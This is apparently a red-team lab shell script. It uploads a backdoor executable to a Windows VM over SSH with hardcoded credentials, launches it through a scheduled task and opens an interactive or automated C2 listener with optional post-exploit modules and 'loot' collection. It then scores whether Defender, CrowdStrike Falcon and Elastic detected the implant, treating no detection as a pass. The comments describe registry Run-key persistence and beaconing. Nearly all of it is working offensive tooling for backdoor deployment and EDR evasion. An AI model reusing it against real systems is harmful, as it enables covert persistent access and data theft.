#!/bin/bash
# Deploy backdoor payload to Windows VM.
#
# Default:  deploy + persistent access (interactive C2 shell)
# --test:   deploy + automated test sequence + snapshot restore
#
# The backdoor persists via registry Run key and beacons every ~10s.
# In interactive mode: Ctrl+C disconnects (implant keeps beaconing).
# Type 'exit' in C2 shell to kill the implant remotely.
#
# Usage: deploy_backdoor.sh [payload.exe] [--test] [--c2-port PORT] [--timeout N]
#        [--post-exploit] [--modules mod1,mod2] [--sign] [--snapshot NAME]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

VM_PORT=${VM_PORT:-10022}
VM_USER=${VM_USER:-vmuser}
VM_PASS=${VM_PASS:-vmuser123}
C2_PORT=${C2_PORT:-9001}
VM_SNAPSHOT=${VM_SNAPSHOT:-crowdstrike}
TIMEOUT=${TIMEOUT:-120}
TEST_MODE=0
POST_EXPLOIT=""
POST_MODULES=""
SIGN=""
PAYLOAD="${1:-$PROJECT_DIR/results/latest/payload.exe}"
TASK_NAME="backdoor_test"

ssh_cmd() {
    sshpass -p "$VM_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p "$VM_PORT" "$VM_USER@localhost" "$@"
}
scp_cmd() {
    sshpass -p "$VM_PASS" scp -o StrictHostKeyChecking=no -P "$VM_PORT" "$@"
}

restore_vm() {
    echo ""
    echo "[*] Restoring VM snapshot..."
    if "$SCRIPT_DIR/vm_snapshot.sh" restore "$VM_SNAPSHOT" 2>/dev/null; then
        echo "  OK (restored $VM_SNAPSHOT)"
    else
        echo "  No snapshot to restore, cleaning up manually..."
        ssh_cmd "taskkill /f /im payload.exe 2>nul & del /f C:\\Users\\$VM_USER\\Desktop\\payload.exe 2>nul & schtasks /delete /tn $TASK_NAME /f 2>nul" 2>/dev/null || true
        echo "  Done"
    fi
    fuser -k $C2_PORT/tcp 2>/dev/null || true
}

# Parse extra args
shift 2>/dev/null || true
while [[ $# -gt 0 ]]; do
    case "$1" in
        --test) TEST_MODE=1; shift ;;
        --c2-port) C2_PORT="$2"; shift 2 ;;
        --timeout) TIMEOUT="$2"; shift 2 ;;
        --timeout=*) TIMEOUT="${1#*=}"; shift ;;
        --post-exploit) POST_EXPLOIT="1"; shift ;;
        --modules) POST_MODULES="$2"; shift 2 ;;
        --sign) SIGN="1"; shift ;;
        --snapshot) VM_SNAPSHOT="$2"; shift 2 ;;
        --snapshot=*) VM_SNAPSHOT="${1#*=}"; shift ;;
        *) shift ;;
    esac
done

echo ""
echo "============================================"
echo "  BACKDOOR DEPLOY"
echo "============================================"
echo "  Payload:  $PAYLOAD"
echo "  C2 Port:  $C2_PORT"
if [ "$TEST_MODE" = "1" ]; then
echo "  Mode:     TEST (auto sequence + restore)"
echo "  Timeout:  ${TIMEOUT}s"
else
echo "  Mode:     PERSISTENT (interactive C2)"
fi
echo "  Snapshot: $VM_SNAPSHOT"
if [ -n "$POST_EXPLOIT" ]; then
echo "  Post-exploit: YES${POST_MODULES:+ (modules: $POST_MODULES)}"
fi
echo "============================================"
echo ""

# Check payload exists
if [ ! -f "$PAYLOAD" ]; then
    echo "[!] Payload not found: $PAYLOAD"
    exit 1
fi

# Step 0: Sign payload if requested
if [ -n "$SIGN" ]; then
    echo "[0] Signing payload..."
    if "$SCRIPT_DIR/sign_payload.sh" "$PAYLOAD"; then
        echo "  OK"
    else
        echo "  [!] Signing failed, continuing unsigned"
    fi
    echo ""
fi

# Step 1: Check VM alive
echo "[1/5] Checking VM connectivity..."
if ! ssh_cmd "echo VM_ALIVE" 2>/dev/null | tr -d '\r' | grep -q "VM_ALIVE"; then
    echo "[!] VM not reachable on port $VM_PORT"
    exit 1
fi
echo "  OK"

# Step 2: Upload payload (use home-relative path for Windows OpenSSH SCP)
echo "[2/5] Uploading payload ($(stat -c%s "$PAYLOAD") bytes)..."
scp_cmd "$PAYLOAD" "$VM_USER@localhost:Desktop\\payload.exe" 2>&1
echo "  OK"

# Step 3: Check EDR quarantine
echo "[3/5] Checking if binary survived EDR (2s wait)..."
sleep 2
EXISTS=$(ssh_cmd 'if exist C:\Users\vmuser\Desktop\payload.exe (echo EXISTS) else (echo GONE)' 2>/dev/null | tr -d '\r')
if echo "$EXISTS" | grep -q "GONE"; then
    echo "  QUARANTINED by EDR"
    echo ""
    echo "  Detection info:"
    ssh_cmd 'powershell -Command "Get-MpThreatDetection | Select-Object -Last 1 | Format-List"' 2>/dev/null | sed 's/^/    /'
    echo ""
    echo "RESULT: EVASION FAIL (static detection)"
    restore_vm
    exit 2
fi
echo "  OK — binary intact"

# Step 4: Execute payload via schtasks (detached from SSH session)
echo "[4/5] Executing payload..."
ssh_cmd "schtasks /create /tn $TASK_NAME /tr C:\\Users\\$VM_USER\\Desktop\\payload.exe /sc once /st 00:00 /f >nul 2>&1 && schtasks /run /tn $TASK_NAME >nul 2>&1 && schtasks /delete /tn $TASK_NAME /f >nul 2>&1" 2>/dev/null
echo "  OK (launched via schtasks)"

# Step 5: C2
echo "[5/5] Starting C2..."
echo ""
fuser -k $C2_PORT/tcp 2>/dev/null || true
sleep 1

if [ "$TEST_MODE" = "1" ]; then
    # Automated test sequence
    C2_MODE_ARGS="--test-sequence --timeout $TIMEOUT"
    C2_MODE_LABEL="test-sequence"
    if [ -n "$POST_EXPLOIT" ]; then
        C2_MODE_ARGS="--post-exploit --timeout ${TIMEOUT:-300}"
        C2_MODE_LABEL="post-exploit"
        if [ -n "$POST_MODULES" ]; then
            C2_MODE_ARGS="$C2_MODE_ARGS --modules $POST_MODULES"
        fi
    fi

    python3 -u "$SCRIPT_DIR/c2_backdoor.py" --port $C2_PORT $C2_MODE_ARGS &
    C2_PID=$!
    sleep 2

    if ! kill -0 $C2_PID 2>/dev/null; then
        echo "  [!] C2 controller failed to start"
        restore_vm
        exit 1
    fi
    echo "  Listening on :$C2_PORT ($C2_MODE_LABEL, timeout: ${TIMEOUT}s)"
    echo ""

    wait $C2_PID 2>/dev/null
    C2_RC=$?

    echo ""
    echo "============================================"

    # Check Defender post-execution
    echo "[*] Checking Defender post-execution detections..."
    DEFENDER_DETECTIONS=$(ssh_cmd 'powershell -Command "(Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) }).Count"' 2>/dev/null | tr -d '\r' | grep -E '^[0-9]+$' || echo "0")

    # Check CrowdStrike Falcon
    echo "[*] Checking CrowdStrike Falcon..."
    CS_STATUS="n/a"
    CS_KILLED=""
    CS_EVENTS="0"
    if ssh_cmd 'sc query csfalconservice' 2>/dev/null | tr -d '\r' | grep -q "RUNNING"; then
        CS_STATUS="active"
        CS_EXISTS=$(ssh_cmd "if exist C:\\Users\\$VM_USER\\Desktop\\payload.exe (echo EXISTS) else (echo GONE)" 2>/dev/null | tr -d '\r')
        if echo "$CS_EXISTS" | grep -q "GONE"; then
            CS_KILLED="quarantined"
        fi
        CS_PROC=$(ssh_cmd 'tasklist /fi "IMAGENAME eq payload.exe" /fo csv /nh 2>nul' 2>/dev/null | tr -d '\r')
        if [ -n "$CS_PROC" ] && echo "$CS_PROC" | grep -qi "payload.exe"; then
            :
        elif [ "$C2_RC" -ne 0 ]; then
            CS_KILLED="${CS_KILLED:+$CS_KILLED+}process_killed"
        fi
        CS_EVENTS=$(ssh_cmd 'powershell -Command "(Get-WinEvent -LogName \"CrowdStrike Falcon/Operational\" -MaxEvents 50 -ErrorAction SilentlyContinue | Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-5) -and $_.LevelDisplayName -match \"Warning|Error|Critical\" }).Count"' 2>/dev/null | tr -d '\r' | grep -E '^[0-9]+$' || echo "0")
    else
        CS_STATUS="not_installed"
    fi

    # Check Elastic alerts
    echo "[*] Checking Elastic alerts..."
    ELASTIC_ALERTS="0"
    if command -v curl &>/dev/null; then
        ELASTIC_ALERTS=$(curl -sk -u elastic:changeme "https://localhost:9200/.alerts-security*/_search?size=100" 2>/dev/null | python3 -c "
import json, sys
DEPLOY_NOISE = {'schtasks.exe','tasklist.exe','HOSTNAME.EXE','hostname.exe','cmd.exe','sshd.exe','reg.exe'}
data = json.load(sys.stdin)
payload_alerts = 0
for h in data.get('hits',{}).get('hits',[]):
    s = h.get('_source',{})
    proc = s.get('process',{}).get('name','')
    parent = s.get('process',{}).get('parent',{}).get('name','')
    if proc in DEPLOY_NOISE or parent in ('sshd.exe','cmd.exe'):
        continue
    payload_alerts += 1
print(payload_alerts)
" 2>/dev/null || echo "0")
    fi

    echo ""
    echo "============================================"
    echo "  RESULTS"
    echo "============================================"
    echo "  C2 test:          $([ $C2_RC -eq 0 ] && echo 'PASS' || echo 'FAIL')"
    echo "  Defender:         $DEFENDER_DETECTIONS detections"
    echo "  CrowdStrike:      ${CS_STATUS}${CS_KILLED:+ ($CS_KILLED)} — $CS_EVENTS events"
    echo "  Elastic alerts:   $ELASTIC_ALERTS"
    if [ -n "$POST_EXPLOIT" ]; then
        LOOT_DIR=$(find "$PROJECT_DIR/results" -maxdepth 2 -name "loot_*" -type d 2>/dev/null | sort | tail -1)
        if [ -n "$LOOT_DIR" ]; then
            LOOT_COUNT=$(find "$LOOT_DIR" -type f | wc -l)
            LOOT_SIZE=$(du -sh "$LOOT_DIR" 2>/dev/null | cut -f1)
            echo "  Loot:             $LOOT_COUNT files ($LOOT_SIZE)"
            echo "  Loot dir:         $LOOT_DIR"
        fi
    fi
    echo "============================================"

    CS_FAIL=""
    if [ "$CS_STATUS" = "active" ] && [ -n "$CS_KILLED" ]; then
        CS_FAIL="1"
    fi

    if [ "$C2_RC" -eq 0 ] && [ "$DEFENDER_DETECTIONS" = "0" ] && [ "$ELASTIC_ALERTS" = "0" ] && [ -z "$CS_FAIL" ]; then
        echo ""
        echo "  OVERALL: PASS"
    else
        echo ""
        echo "  OVERALL: FAIL"
        [ "$C2_RC" -ne 0 ] && echo "    - C2 test sequence failed"
        [ "$DEFENDER_DETECTIONS" != "0" ] && echo "    - Defender detected ($DEFENDER_DETECTIONS threats)"
        [ -n "$CS_FAIL" ] && echo "    - CrowdStrike Falcon detected (${CS_KILLED:-events: $CS_EVENTS})"
        [ "$ELASTIC_ALERTS" != "0" ] && echo "    - Elastic alerts fired ($ELASTIC_ALERTS)"
    fi

    # Always restore VM after test
    restore_vm
    exit $C2_RC

else
    # Interactive persistent access
    echo "============================================================"
    echo "  Backdoor active. Beacons every ~10s."
    echo "  Persistence via registry Run key (survives reboot)."
    echo "  Ctrl+C to disconnect (implant keeps running)."
    echo "  Type 'exit' to kill the implant remotely."
    echo "============================================================"
    echo ""

    # Use the package-local c2_listener.py if it exists, else fall back to c2_backdoor.py
    PKG_DIR="$(dirname "$PAYLOAD")"
    if [ -f "$PKG_DIR/c2_listener.py" ]; then
        python3 "$PKG_DIR/c2_listener.py" --port $C2_PORT --out-dir "$PKG_DIR"
    else
        python3 -u "$SCRIPT_DIR/c2_backdoor.py" --port $C2_PORT --timeout 0
    fi

    # Always restore VM after interactive session
    restore_vm
fi
